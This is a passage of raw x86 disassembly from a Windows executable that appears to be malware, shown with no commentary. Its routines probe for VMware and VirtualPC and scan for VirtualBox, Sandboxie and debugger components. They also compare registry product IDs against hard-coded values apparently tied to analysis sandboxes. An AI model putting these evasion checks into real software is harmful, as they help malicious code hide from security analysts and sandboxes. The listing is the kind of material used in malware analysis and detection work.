  407613:	e8 8c c1 ff ff       	call   0x4037a4
  407618:	b8 ec b8 40 00       	mov    $0x40b8ec,%eax
  40761d:	8b 93 14 01 00 00    	mov    0x114(%ebx),%edx
  407623:	e8 7c c1 ff ff       	call   0x4037a4
  407628:	b8 48 b9 40 00       	mov    $0x40b948,%eax
  40762d:	8b 93 24 01 00 00    	mov    0x124(%ebx),%edx
  407633:	e8 6c c1 ff ff       	call   0x4037a4
  407638:	8b 83 28 01 00 00    	mov    0x128(%ebx),%eax
  40763e:	e8 55 fc ff ff       	call   0x407298
  407643:	8b 15 ec a0 40 00    	mov    0x40a0ec,%edx
  407649:	88 02                	mov    %al,(%edx)
  40764b:	b8 50 b9 40 00       	mov    $0x40b950,%eax
  407650:	8b 93 8c 01 00 00    	mov    0x18c(%ebx),%edx
  407656:	e8 49 c1 ff ff       	call   0x4037a4
  40765b:	b8 54 b9 40 00       	mov    $0x40b954,%eax
  407660:	8b 93 90 01 00 00    	mov    0x190(%ebx),%edx
  407666:	e8 39 c1 ff ff       	call   0x4037a4
  40766b:	5d                   	pop    %ebp
  40766c:	5f                   	pop    %edi
  40766d:	5e                   	pop    %esi
  40766e:	5b                   	pop    %ebx
  40766f:	c3                   	ret
  407670:	55                   	push   %ebp
  407671:	8b ec                	mov    %esp,%ebp
  407673:	33 c0                	xor    %eax,%eax
  407675:	55                   	push   %ebp
  407676:	68 dc 77 40 00       	push   $0x4077dc
  40767b:	64 ff 30             	push   %fs:(%eax)
  40767e:	64 89 20             	mov    %esp,%fs:(%eax)
  407681:	ff 05 70 b9 40 00    	incl   0x40b970
  407687:	0f 85 41 01 00 00    	jne    0x4077ce
  40768d:	b8 6c b9 40 00       	mov    $0x40b96c,%eax
  407692:	e8 b9 c0 ff ff       	call   0x403750
  407697:	b8 68 b9 40 00       	mov    $0x40b968,%eax
  40769c:	e8 af c0 ff ff       	call   0x403750
  4076a1:	b8 64 b9 40 00       	mov    $0x40b964,%eax
  4076a6:	e8 a5 c0 ff ff       	call   0x403750
  4076ab:	b8 60 b9 40 00       	mov    $0x40b960,%eax
  4076b0:	e8 9b c0 ff ff       	call   0x403750
  4076b5:	b8 5c b9 40 00       	mov    $0x40b95c,%eax
  4076ba:	e8 91 c0 ff ff       	call   0x403750
  4076bf:	b8 58 b9 40 00       	mov    $0x40b958,%eax
  4076c4:	e8 87 c0 ff ff       	call   0x403750
  4076c9:	b8 54 b9 40 00       	mov    $0x40b954,%eax
  4076ce:	e8 7d c0 ff ff       	call   0x403750
  4076d3:	b8 50 b9 40 00       	mov    $0x40b950,%eax
  4076d8:	e8 73 c0 ff ff       	call   0x403750
  4076dd:	b8 4c b9 40 00       	mov    $0x40b94c,%eax
  4076e2:	e8 69 c0 ff ff       	call   0x403750
  4076e7:	b8 48 b9 40 00       	mov    $0x40b948,%eax
  4076ec:	e8 5f c0 ff ff       	call   0x403750
  4076f1:	b8 44 b9 40 00       	mov    $0x40b944,%eax
  4076f6:	e8 55 c0 ff ff       	call   0x403750
  4076fb:	b8 40 b9 40 00       	mov    $0x40b940,%eax
  407700:	e8 4b c0 ff ff       	call   0x403750
  407705:	b8 38 b9 40 00       	mov    $0x40b938,%eax
  40770a:	e8 41 c0 ff ff       	call   0x403750
  40770f:	b8 30 b9 40 00       	mov    $0x40b930,%eax
  407714:	e8 37 c0 ff ff       	call   0x403750
  407719:	b8 14 b9 40 00       	mov    $0x40b914,%eax
  40771e:	e8 2d c0 ff ff       	call   0x403750
  407723:	b8 10 b9 40 00       	mov    $0x40b910,%eax
  407728:	e8 23 c0 ff ff       	call   0x403750
  40772d:	b8 0c b9 40 00       	mov    $0x40b90c,%eax
  407732:	e8 19 c0 ff ff       	call   0x403750
  407737:	b8 08 b9 40 00       	mov    $0x40b908,%eax
  40773c:	e8 0f c0 ff ff       	call   0x403750
  407741:	b8 00 b9 40 00       	mov    $0x40b900,%eax
  407746:	e8 05 c0 ff ff       	call   0x403750
  40774b:	b8 fc b8 40 00       	mov    $0x40b8fc,%eax
  407750:	e8 fb bf ff ff       	call   0x403750
  407755:	b8 ec b8 40 00       	mov    $0x40b8ec,%eax
  40775a:	e8 f1 bf ff ff       	call   0x403750
  40775f:	b8 e8 b8 40 00       	mov    $0x40b8e8,%eax
  407764:	e8 e7 bf ff ff       	call   0x403750
  407769:	b8 e4 b8 40 00       	mov    $0x40b8e4,%eax
  40776e:	e8 dd bf ff ff       	call   0x403750
  407773:	b8 e0 b8 40 00       	mov    $0x40b8e0,%eax
  407778:	e8 d3 bf ff ff       	call   0x403750
  40777d:	b8 dc b8 40 00       	mov    $0x40b8dc,%eax
  407782:	e8 c9 bf ff ff       	call   0x403750
  407787:	b8 d8 b8 40 00       	mov    $0x40b8d8,%eax
  40778c:	e8 bf bf ff ff       	call   0x403750
  407791:	b8 d4 b8 40 00       	mov    $0x40b8d4,%eax
  407796:	e8 b5 bf ff ff       	call   0x403750
  40779b:	b8 c8 b8 40 00       	mov    $0x40b8c8,%eax
  4077a0:	e8 ab bf ff ff       	call   0x403750
  4077a5:	b8 c4 b8 40 00       	mov    $0x40b8c4,%eax
  4077aa:	e8 a1 bf ff ff       	call   0x403750
  4077af:	b8 c0 b8 40 00       	mov    $0x40b8c0,%eax
  4077b4:	e8 97 bf ff ff       	call   0x403750
  4077b9:	b8 70 b8 40 00       	mov    $0x40b870,%eax
  4077be:	b9 14 00 00 00       	mov    $0x14,%ecx
  4077c3:	8b 15 00 10 40 00    	mov    0x401000,%edx
  4077c9:	e8 22 c6 ff ff       	call   0x403df0
  4077ce:	33 c0                	xor    %eax,%eax
  4077d0:	5a                   	pop    %edx
  4077d1:	59                   	pop    %ecx
  4077d2:	59                   	pop    %ecx
  4077d3:	64 89 10             	mov    %edx,%fs:(%eax)
  4077d6:	68 e3 77 40 00       	push   $0x4077e3
  4077db:	c3                   	ret
  4077dc:	e9 e3 b9 ff ff       	jmp    0x4031c4
  4077e1:	eb f8                	jmp    0x4077db
  4077e3:	5d                   	pop    %ebp
  4077e4:	c3                   	ret
  4077e5:	8d 40 00             	lea    0x0(%eax),%eax
  4077e8:	83 2d 70 b9 40 00 01 	subl   $0x1,0x40b970
  4077ef:	c3                   	ret
  4077f0:	31 c0                	xor    %eax,%eax
  4077f2:	68 18 78 40 00       	push   $0x407818
  4077f7:	64 ff 30             	push   %fs:(%eax)
  4077fa:	64 89 20             	mov    %esp,%fs:(%eax)
  4077fd:	b8 68 58 4d 56       	mov    $0x564d5868,%eax
  407802:	bb 12 f7 6c 3c       	mov    $0x3c6cf712,%ebx
  407807:	b9 0a 00 00 00       	mov    $0xa,%ecx
  40780c:	66 ba 58 56          	mov    $0x5658,%dx
  407810:	ed                   	in     (%dx),%eax
  407811:	b8 01 00 00 00       	mov    $0x1,%eax
  407816:	eb 13                	jmp    0x40782b
  407818:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40781c:	c7 80 b8 00 00 00 29 	movl   $0x407829,0xb8(%eax)
  407823:	78 40 00 
  407826:	31 c0                	xor    %eax,%eax
  407828:	c3                   	ret
  407829:	31 c0                	xor    %eax,%eax
  40782b:	31 db                	xor    %ebx,%ebx
  40782d:	64 8f 03             	pop    %fs:(%ebx)
  407830:	83 c4 04             	add    $0x4,%esp
  407833:	c3                   	ret
  407834:	55                   	push   %ebp
  407835:	b9 7e 78 40 00       	mov    $0x40787e,%ecx
  40783a:	89 e5                	mov    %esp,%ebp
  40783c:	53                   	push   %ebx
  40783d:	51                   	push   %ecx
  40783e:	64 ff 35 00 00 00 00 	push   %fs:0x0
  407845:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40784c:	bb 00 00 00 00       	mov    $0x0,%ebx
  407851:	b8 01 00 00 00       	mov    $0x1,%eax
  407856:	0f 3f                	(bad)
  407858:	07                   	pop    %es
  407859:	0b 36                	or     (%esi),%esi
  40785b:	8b 04 24             	mov    (%esp),%eax
  40785e:	64 89 05 00 00 00 00 	mov    %eax,%fs:0x0
  407865:	83 c4 08             	add    $0x8,%esp
  407868:	85 db                	test   %ebx,%ebx
  40786a:	0f 94 c0             	sete   %al
  40786d:	36 8d 65 fc          	lea    %ss:-0x4(%ebp),%esp
  407871:	36 8b 1c 24          	mov    %ss:(%esp),%ebx
  407875:	36 8b 6c 24 04       	mov    %ss:0x4(%esp),%ebp
  40787a:	83 c4 08             	add    $0x8,%esp
  40787d:	c3                   	ret
  40787e:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  407882:	c7 81 a4 00 00 00 ff 	movl   $0xffffffff,0xa4(%ecx)
  407889:	ff ff ff 
  40788c:	83 81 b8 00 00 00 04 	addl   $0x4,0xb8(%ecx)
  407893:	31 c0                	xor    %eax,%eax
  407895:	c3                   	ret
  407896:	c3                   	ret
  407897:	90                   	nop
  407898:	55                   	push   %ebp
  407899:	8b ec                	mov    %esp,%ebp
  40789b:	81 c4 c8 fe ff ff    	add    $0xfffffec8,%esp
  4078a1:	53                   	push   %ebx
  4078a2:	56                   	push   %esi
  4078a3:	33 c0                	xor    %eax,%eax
  4078a5:	89 85 d4 fe ff ff    	mov    %eax,-0x12c(%ebp)
  4078ab:	89 85 cc fe ff ff    	mov    %eax,-0x134(%ebp)
  4078b1:	89 85 c8 fe ff ff    	mov    %eax,-0x138(%ebp)
  4078b7:	89 85 d0 fe ff ff    	mov    %eax,-0x130(%ebp)
  4078bd:	33 c0                	xor    %eax,%eax
  4078bf:	55                   	push   %ebp
  4078c0:	68 90 79 40 00       	push   $0x407990
  4078c5:	64 ff 30             	push   %fs:(%eax)
  4078c8:	64 89 20             	mov    %esp,%fs:(%eax)
  4078cb:	33 db                	xor    %ebx,%ebx
  4078cd:	33 d2                	xor    %edx,%edx
  4078cf:	b8 02 00 00 00       	mov    $0x2,%eax
  4078d4:	e8 5f e6 ff ff       	call   0x405f38
  4078d9:	8b f0                	mov    %eax,%esi
  4078db:	c7 85 d8 fe ff ff 28 	movl   $0x128,-0x128(%ebp)
  4078e2:	01 00 00 
  4078e5:	eb 70                	jmp    0x407957
  4078e7:	8d 85 d0 fe ff ff    	lea    -0x130(%ebp),%eax
  4078ed:	8d 95 fc fe ff ff    	lea    -0x104(%ebp),%edx
  4078f3:	b9 04 01 00 00       	mov    $0x104,%ecx
  4078f8:	e8 af bf ff ff       	call   0x4038ac
  4078fd:	8b 85 d0 fe ff ff    	mov    -0x130(%ebp),%eax
  407903:	8d 95 d4 fe ff ff    	lea    -0x12c(%ebp),%edx
  407909:	e8 4a f8 ff ff       	call   0x407158
  40790e:	8b 85 d4 fe ff ff    	mov    -0x12c(%ebp),%eax
  407914:	50                   	push   %eax
  407915:	8d 95 c8 fe ff ff    	lea    -0x138(%ebp),%edx
  40791b:	b8 a8 79 40 00       	mov    $0x4079a8,%eax
  407920:	e8 33 f8 ff ff       	call   0x407158
  407925:	8b 85 c8 fe ff ff    	mov    -0x138(%ebp),%eax
  40792b:	e8 94 c1 ff ff       	call   0x403ac4
  407930:	8b d0                	mov    %eax,%edx
  407932:	8d 85 cc fe ff ff    	lea    -0x134(%ebp),%eax
  407938:	e8 33 bf ff ff       	call   0x403870
  40793d:	8b 85 cc fe ff ff    	mov    -0x134(%ebp),%eax
  407943:	5a                   	pop    %edx
  407944:	e8 63 c2 ff ff       	call   0x403bac
  407949:	85 c0                	test   %eax,%eax
  40794b:	7e 0a                	jle    0x407957
  40794d:	56                   	push   %esi
  40794e:	e8 f5 d1 ff ff       	call   0x404b48
  407953:	b3 01                	mov    $0x1,%bl
  407955:	eb 1b                	jmp    0x407972
  407957:	8d 95 d8 fe ff ff    	lea    -0x128(%ebp),%edx
  40795d:	8b c6                	mov    %esi,%eax
  40795f:	e8 14 e6 ff ff       	call   0x405f78
  407964:	85 c0                	test   %eax,%eax
  407966:	0f 85 7b ff ff ff    	jne    0x4078e7
  40796c:	56                   	push   %esi
  40796d:	e8 d6 d1 ff ff       	call   0x404b48
  407972:	33 c0                	xor    %eax,%eax
  407974:	5a                   	pop    %edx
  407975:	59                   	pop    %ecx
  407976:	59                   	pop    %ecx
  407977:	64 89 10             	mov    %edx,%fs:(%eax)
  40797a:	68 97 79 40 00       	push   $0x407997
  40797f:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
  407985:	ba 04 00 00 00       	mov    $0x4,%edx
  40798a:	e8 e5 bd ff ff       	call   0x403774
  40798f:	c3                   	ret
  407990:	e9 2f b8 ff ff       	jmp    0x4031c4
  407995:	eb e8                	jmp    0x40797f
  407997:	8b c3                	mov    %ebx,%eax
  407999:	5e                   	pop    %esi
  40799a:	5b                   	pop    %ebx
  40799b:	8b e5                	mov    %ebp,%esp
  40799d:	5d                   	pop    %ebp
  40799e:	c3                   	ret
  40799f:	00 ff                	add    %bh,%bh
  4079a1:	ff                   	(bad)
  4079a2:	ff                   	(bad)
  4079a3:	ff 0f                	decl   (%edi)
  4079a5:	00 00                	add    %al,(%eax)
  4079a7:	00 56 42             	add    %dl,0x42(%esi)
  4079aa:	6f                   	outsl  %ds:(%esi),(%dx)
  4079ab:	78 53                	js     0x407a00
  4079ad:	65 72 76             	gs jb  0x407a26
  4079b0:	69 63 65 2e 65 78 65 	imul   $0x6578652e,0x65(%ebx),%esp
  4079b7:	00 53 33             	add    %dl,0x33(%ebx)
  4079ba:	db 68 d0             	fldt   -0x30(%eax)
  4079bd:	79 40                	jns    0x4079ff
  4079bf:	00 e8                	add    %ch,%al
  4079c1:	2b d2                	sub    %edx,%edx
  4079c3:	ff                   	(bad)
  4079c4:	ff 85 c0 74 02 b3    	incl   -0x4cfd8b40(%ebp)
  4079ca:	01 8b c3 5b c3 00    	add    %ecx,0xc35bc3(%ebx)
  4079d0:	53                   	push   %ebx
  4079d1:	62 69 65             	bound  %ebp,0x65(%ecx)
  4079d4:	44                   	inc    %esp
  4079d5:	6c                   	insb   (%dx),%es:(%edi)
  4079d6:	6c                   	insb   (%dx),%es:(%edi)
  4079d7:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4079da:	6c                   	insb   (%dx),%es:(%edi)
  4079db:	00 53 33             	add    %dl,0x33(%ebx)
  4079de:	db 68 f4             	fldt   -0xc(%eax)
  4079e1:	79 40                	jns    0x407a23
  4079e3:	00 e8                	add    %ch,%al
  4079e5:	07                   	pop    %es
  4079e6:	d2 ff                	sar    %cl,%bh
  4079e8:	ff 85 c0 74 02 b3    	incl   -0x4cfd8b40(%ebp)
  4079ee:	01 8b c3 5b c3 00    	add    %ecx,0xc35bc3(%ebx)
  4079f4:	64 62 67 68          	bound  %esp,%fs:0x68(%edi)
  4079f8:	65 6c                	gs insb (%dx),%es:(%edi)
  4079fa:	70 2e                	jo     0x407a2a
  4079fc:	64 6c                	fs insb (%dx),%es:(%edi)
  4079fe:	6c                   	insb   (%dx),%es:(%edi)
  4079ff:	00 53 81             	add    %dl,-0x7f(%ebx)
  407a02:	c4                   	(bad)
  407a03:	f4                   	hlt
  407a04:	fe                   	(bad)
  407a05:	ff                   	(bad)
  407a06:	ff 33                	push   (%ebx)
  407a08:	db 54 6a 01          	fistl  0x1(%edx,%ebp,2)
  407a0c:	6a 00                	push   $0x0
  407a0e:	68 68 7a 40 00       	push   $0x407a68
  407a13:	68 02 00 00 80       	push   $0x80000002
  407a18:	e8 13 d1 ff ff       	call   0x404b30
  407a1d:	85 c0                	test   %eax,%eax
  407a1f:	75 32                	jne    0x407a53
  407a21:	c7 44 24 04 01 01 00 	movl   $0x101,0x4(%esp)
  407a28:	00 
  407a29:	8d 44 24 04          	lea    0x4(%esp),%eax
  407a2d:	50                   	push   %eax
  407a2e:	8d 44 24 0c          	lea    0xc(%esp),%eax
  407a32:	50                   	push   %eax
  407a33:	6a 00                	push   $0x0
  407a35:	6a 00                	push   $0x0
  407a37:	68 94 7a 40 00       	push   $0x407a94
  407a3c:	8b 44 24 14          	mov    0x14(%esp),%eax
  407a40:	50                   	push   %eax
  407a41:	e8 f2 d0 ff ff       	call   0x404b38
  407a46:	8d 44 24 08          	lea    0x8(%esp),%eax
  407a4a:	3d a0 7a 40 00       	cmp    $0x407aa0,%eax
  407a4f:	75 02                	jne    0x407a53
  407a51:	b3 01                	mov    $0x1,%bl
  407a53:	8b 04 24             	mov    (%esp),%eax
  407a56:	50                   	push   %eax
  407a57:	e8 b4 d0 ff ff       	call   0x404b10
  407a5c:	8b c3                	mov    %ebx,%eax
  407a5e:	81 c4 0c 01 00 00    	add    $0x10c,%esp
  407a64:	5b                   	pop    %ebx
  407a65:	c3                   	ret
  407a66:	00 00                	add    %al,(%eax)
  407a68:	53                   	push   %ebx
  407a69:	6f                   	outsl  %ds:(%esi),(%dx)
  407a6a:	66 74 77             	data16 je 0x407ae4
  407a6d:	61                   	popa
  407a6e:	72 65                	jb     0x407ad5
  407a70:	5c                   	pop    %esp
  407a71:	4d                   	dec    %ebp
  407a72:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407a79:	74 5c                	je     0x407ad7
  407a7b:	57                   	push   %edi
  407a7c:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  407a83:	43                   	inc    %ebx
  407a84:	75 72                	jne    0x407af8
  407a86:	72 65                	jb     0x407aed
  407a88:	6e                   	outsb  %ds:(%esi),(%dx)
  407a89:	74 56                	je     0x407ae1
  407a8b:	65 72 73             	gs jb  0x407b01
  407a8e:	69 6f 6e 00 00 00 50 	imul   $0x50000000,0x6e(%edi),%ebp
  407a95:	72 6f                	jb     0x407b06
  407a97:	64 75 63             	fs jne 0x407afd
  407a9a:	74 49                	je     0x407ae5
  407a9c:	64 00 00             	add    %al,%fs:(%eax)
  407a9f:	00 35 35 32 37 34    	add    %dh,0x34373235
  407aa5:	2d 36 34 30 2d       	sub    $0x2d303436,%eax
  407aaa:	32 36                	xor    (%esi),%dh
  407aac:	37                   	aaa
  407aad:	33 30                	xor    (%eax),%esi
  407aaf:	36 34 2d             	ss xor $0x2d,%al
  407ab2:	32 33                	xor    (%ebx),%dh
  407ab4:	39 35 30 00 53 81    	cmp    %esi,0x81530030
  407aba:	c4                   	(bad)
  407abb:	f4                   	hlt
  407abc:	fe                   	(bad)
  407abd:	ff                   	(bad)
  407abe:	ff 33                	push   (%ebx)
  407ac0:	db 54 6a 01          	fistl  0x1(%edx,%ebp,2)
  407ac4:	6a 00                	push   $0x0
  407ac6:	68 20 7b 40 00       	push   $0x407b20
  407acb:	68 02 00 00 80       	push   $0x80000002
  407ad0:	e8 5b d0 ff ff       	call   0x404b30
  407ad5:	85 c0                	test   %eax,%eax
  407ad7:	75 32                	jne    0x407b0b
  407ad9:	c7 44 24 04 01 01 00 	movl   $0x101,0x4(%esp)
  407ae0:	00 
  407ae1:	8d 44 24 04          	lea    0x4(%esp),%eax
  407ae5:	50                   	push   %eax
  407ae6:	8d 44 24 0c          	lea    0xc(%esp),%eax
  407aea:	50                   	push   %eax
  407aeb:	6a 00                	push   $0x0
  407aed:	6a 00                	push   $0x0
  407aef:	68 4c 7b 40 00       	push   $0x407b4c
  407af4:	8b 44 24 14          	mov    0x14(%esp),%eax
  407af8:	50                   	push   %eax
  407af9:	e8 3a d0 ff ff       	call   0x404b38
  407afe:	8d 44 24 08          	lea    0x8(%esp),%eax
  407b02:	3d 58 7b 40 00       	cmp    $0x407b58,%eax
  407b07:	75 02                	jne    0x407b0b
  407b09:	b3 01                	mov    $0x1,%bl
  407b0b:	8b 04 24             	mov    (%esp),%eax
  407b0e:	50                   	push   %eax
  407b0f:	e8 fc cf ff ff       	call   0x404b10
  407b14:	8b c3                	mov    %ebx,%eax
  407b16:	81 c4 0c 01 00 00    	add    $0x10c,%esp
  407b1c:	5b                   	pop    %ebx
  407b1d:	c3                   	ret
  407b1e:	00 00                	add    %al,(%eax)
  407b20:	53                   	push   %ebx
  407b21:	6f                   	outsl  %ds:(%esi),(%dx)
  407b22:	66 74 77             	data16 je 0x407b9c
  407b25:	61                   	popa
  407b26:	72 65                	jb     0x407b8d
  407b28:	5c                   	pop    %esp
  407b29:	4d                   	dec    %ebp
  407b2a:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407b31:	74 5c                	je     0x407b8f
  407b33:	57                   	push   %edi
  407b34:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  407b3b:	43                   	inc    %ebx
  407b3c:	75 72                	jne    0x407bb0
  407b3e:	72 65                	jb     0x407ba5
  407b40:	6e                   	outsb  %ds:(%esi),(%dx)
  407b41:	74 56                	je     0x407b99
  407b43:	65 72 73             	gs jb  0x407bb9
  407b46:	69 6f 6e 00 00 00 50 	imul   $0x50000000,0x6e(%edi),%ebp
  407b4d:	72 6f                	jb     0x407bbe
  407b4f:	64 75 63             	fs jne 0x407bb5
  407b52:	74 49                	je     0x407b9d
  407b54:	64 00 00             	add    %al,%fs:(%eax)
  407b57:	00 37                	add    %dh,(%edi)
  407b59:	36 34 38             	ss xor $0x38,%al
  407b5c:	37                   	aaa
  407b5d:	2d 36 34 34 2d       	sub    $0x2d343436,%eax
  407b62:	33 31                	xor    (%ecx),%esi
  407b64:	37                   	aaa
  407b65:	37                   	aaa
  407b66:	30 33                	xor    %dh,(%ebx)
  407b68:	37                   	aaa
  407b69:	2d 32 33 35 31       	sub    $0x31353332,%eax
  407b6e:	30 00                	xor    %al,(%eax)
  407b70:	53                   	push   %ebx
  407b71:	81 c4 f4 fe ff ff    	add    $0xfffffef4,%esp
  407b77:	33 db                	xor    %ebx,%ebx
  407b79:	54                   	push   %esp
  407b7a:	6a 01                	push   $0x1
  407b7c:	6a 00                	push   $0x0
  407b7e:	68 d8 7b 40 00       	push   $0x407bd8
  407b83:	68 02 00 00 80       	push   $0x80000002
  407b88:	e8 a3 cf ff ff       	call   0x404b30
  407b8d:	85 c0                	test   %eax,%eax
  407b8f:	75 32                	jne    0x407bc3
  407b91:	c7 44 24 04 01 01 00 	movl   $0x101,0x4(%esp)
  407b98:	00 
  407b99:	8d 44 24 04          	lea    0x4(%esp),%eax
  407b9d:	50                   	push   %eax
  407b9e:	8d 44 24 0c          	lea    0xc(%esp),%eax
  407ba2:	50                   	push   %eax
  407ba3:	6a 00                	push   $0x0
  407ba5:	6a 00                	push   $0x0
  407ba7:	68 04 7c 40 00       	push   $0x407c04
  407bac:	8b 44 24 14          	mov    0x14(%esp),%eax
  407bb0:	50                   	push   %eax
  407bb1:	e8 82 cf ff ff       	call   0x404b38
  407bb6:	8d 44 24 08          	lea    0x8(%esp),%eax
  407bba:	3d 10 7c 40 00       	cmp    $0x407c10,%eax
  407bbf:	75 02                	jne    0x407bc3
  407bc1:	b3 01                	mov    $0x1,%bl
  407bc3:	8b 04 24             	mov    (%esp),%eax
  407bc6:	50                   	push   %eax
  407bc7:	e8 44 cf ff ff       	call   0x404b10
  407bcc:	8b c3                	mov    %ebx,%eax
  407bce:	81 c4 0c 01 00 00    	add    $0x10c,%esp
  407bd4:	5b                   	pop    %ebx
  407bd5:	c3                   	ret
  407bd6:	00 00                	add    %al,(%eax)
  407bd8:	53                   	push   %ebx
  407bd9:	6f                   	outsl  %ds:(%esi),(%dx)
  407bda:	66 74 77             	data16 je 0x407c54
  407bdd:	61                   	popa
  407bde:	72 65                	jb     0x407c45
  407be0:	5c                   	pop    %esp
  407be1:	4d                   	dec    %ebp
  407be2:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407be9:	74 5c                	je     0x407c47
  407beb:	57                   	push   %edi
  407bec:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  407bf3:	43                   	inc    %ebx
  407bf4:	75 72                	jne    0x407c68
  407bf6:	72 65                	jb     0x407c5d
  407bf8:	6e                   	outsb  %ds:(%esi),(%dx)
  407bf9:	74 56                	je     0x407c51
  407bfb:	65 72 73             	gs jb  0x407c71
  407bfe:	69 6f 6e 00 00 00 50 	imul   $0x50000000,0x6e(%edi),%ebp
  407c05:	72 6f                	jb     0x407c76
  407c07:	64 75 63             	fs jne 0x407c6d
  407c0a:	74 49                	je     0x407c55
  407c0c:	64 00 00             	add    %al,%fs:(%eax)
  407c0f:	00 37                	add    %dh,(%edi)
  407c11:	36 34 38             	ss xor $0x38,%al
  407c14:	37                   	aaa
  407c15:	2d 33 33 37 2d       	sub    $0x2d373333,%eax
  407c1a:	38 34 32             	cmp    %dh,(%edx,%esi,1)
  407c1d:	39 39                	cmp    %edi,(%ecx)
  407c1f:	35 35 2d 32 32       	xor    $0x32322d35,%eax
  407c24:	36 31 34 00          	xor    %esi,%ss:(%eax,%eax,1)
  407c28:	55                   	push   %ebp
  407c29:	8b ec                	mov    %esp,%ebp
  407c2b:	33 c9                	xor    %ecx,%ecx
  407c2d:	51                   	push   %ecx
  407c2e:	51                   	push   %ecx
  407c2f:	51                   	push   %ecx
  407c30:	51                   	push   %ecx
  407c31:	53                   	push   %ebx
  407c32:	56                   	push   %esi
  407c33:	57                   	push   %edi
  407c34:	33 c0                	xor    %eax,%eax
  407c36:	55                   	push   %ebp
  407c37:	68 d3 7c 40 00       	push   $0x407cd3
  407c3c:	64 ff 30             	push   %fs:(%eax)
  407c3f:	64 89 20             	mov    %esp,%fs:(%eax)
  407c42:	33 c0                	xor    %eax,%eax
  407c44:	55                   	push   %ebp
  407c45:	68 7e 7c 40 00       	push   $0x407c7e
  407c4a:	64 ff 30             	push   %fs:(%eax)
  407c4d:	64 89 20             	mov    %esp,%fs:(%eax)
  407c50:	c7 45 fc 00 01 00 00 	movl   $0x100,-0x4(%ebp)
  407c57:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407c5a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407c5d:	e8 92 bf ff ff       	call   0x403bf4
  407c62:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407c65:	50                   	push   %eax
  407c66:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407c69:	e8 56 be ff ff       	call   0x403ac4
  407c6e:	50                   	push   %eax
  407c6f:	e8 94 ce ff ff       	call   0x404b08
  407c74:	33 c0                	xor    %eax,%eax
  407c76:	5a                   	pop    %edx
  407c77:	59                   	pop    %ecx
  407c78:	59                   	pop    %ecx
  407c79:	64 89 10             	mov    %edx,%fs:(%eax)
  407c7c:	eb 12                	jmp    0x407c90
  407c7e:	e9 15 b4 ff ff       	jmp    0x403098
  407c83:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407c86:	e8 c5 ba ff ff       	call   0x403750
  407c8b:	e8 c0 b5 ff ff       	call   0x403250
  407c90:	8d 55 f4             	lea    -0xc(%ebp),%edx
  407c93:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407c96:	e8 bd f4 ff ff       	call   0x407158
  407c9b:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407c9e:	50                   	push   %eax
  407c9f:	8d 55 f0             	lea    -0x10(%ebp),%edx
  407ca2:	b8 ec 7c 40 00       	mov    $0x407cec,%eax
  407ca7:	e8 ac f4 ff ff       	call   0x407158
  407cac:	8b 55 f0             	mov    -0x10(%ebp),%edx
  407caf:	58                   	pop    %eax
  407cb0:	e8 5b bd ff ff       	call   0x403a10
  407cb5:	0f 94 c3             	sete   %bl
  407cb8:	33 c0                	xor    %eax,%eax
  407cba:	5a                   	pop    %edx
  407cbb:	59                   	pop    %ecx
  407cbc:	59                   	pop    %ecx
  407cbd:	64 89 10             	mov    %edx,%fs:(%eax)
  407cc0:	68 da 7c 40 00       	push   $0x407cda
  407cc5:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407cc8:	ba 03 00 00 00       	mov    $0x3,%edx
  407ccd:	e8 a2 ba ff ff       	call   0x403774
  407cd2:	c3                   	ret
  407cd3:	e9 ec b4 ff ff       	jmp    0x4031c4
  407cd8:	eb eb                	jmp    0x407cc5
  407cda:	8b c3                	mov    %ebx,%eax
  407cdc:	5f                   	pop    %edi
  407cdd:	5e                   	pop    %esi
  407cde:	5b                   	pop    %ebx
  407cdf:	8b e5                	mov    %ebp,%esp
  407ce1:	5d                   	pop    %ebp
  407ce2:	c3                   	ret
  407ce3:	00 ff                	add    %bh,%bh
  407ce5:	ff                   	(bad)
  407ce6:	ff                   	(bad)
  407ce7:	ff 0b                	decl   (%ebx)
  407ce9:	00 00                	add    %al,(%eax)
  407ceb:	00 43 75             	add    %al,0x75(%ebx)
  407cee:	72 72                	jb     0x407d62
  407cf0:	65 6e                	outsb  %gs:(%esi),(%dx)
  407cf2:	74 55                	je     0x407d49
  407cf4:	73 65                	jae    0x407d5b
  407cf6:	72 00                	jb     0x407cf8
  407cf8:	53                   	push   %ebx
  407cf9:	56                   	push   %esi
  407cfa:	57                   	push   %edi
  407cfb:	55                   	push   %ebp
  407cfc:	33 db                	xor    %ebx,%ebx
  407cfe:	68 2c 7d 40 00       	push   $0x407d2c
  407d03:	e8 00 cf ff ff       	call   0x404c08
  407d08:	8b f8                	mov    %eax,%edi
  407d0a:	85 ff                	test   %edi,%edi
  407d0c:	74 17                	je     0x407d25
  407d0e:	68 3c 7d 40 00       	push   $0x407d3c
  407d13:	57                   	push   %edi
  407d14:	e8 df ce ff ff       	call   0x404bf8
  407d19:	8b e8                	mov    %eax,%ebp
  407d1b:	89 ee                	mov    %ebp,%esi
  407d1d:	85 ed                	test   %ebp,%ebp
  407d1f:	74 04                	je     0x407d25
  407d21:	ff d6                	call   *%esi
  407d23:	8b d8                	mov    %eax,%ebx
  407d25:	8b c3                	mov    %ebx,%eax
  407d27:	5d                   	pop    %ebp
  407d28:	5f                   	pop    %edi
  407d29:	5e                   	pop    %esi
  407d2a:	5b                   	pop    %ebx
  407d2b:	c3                   	ret
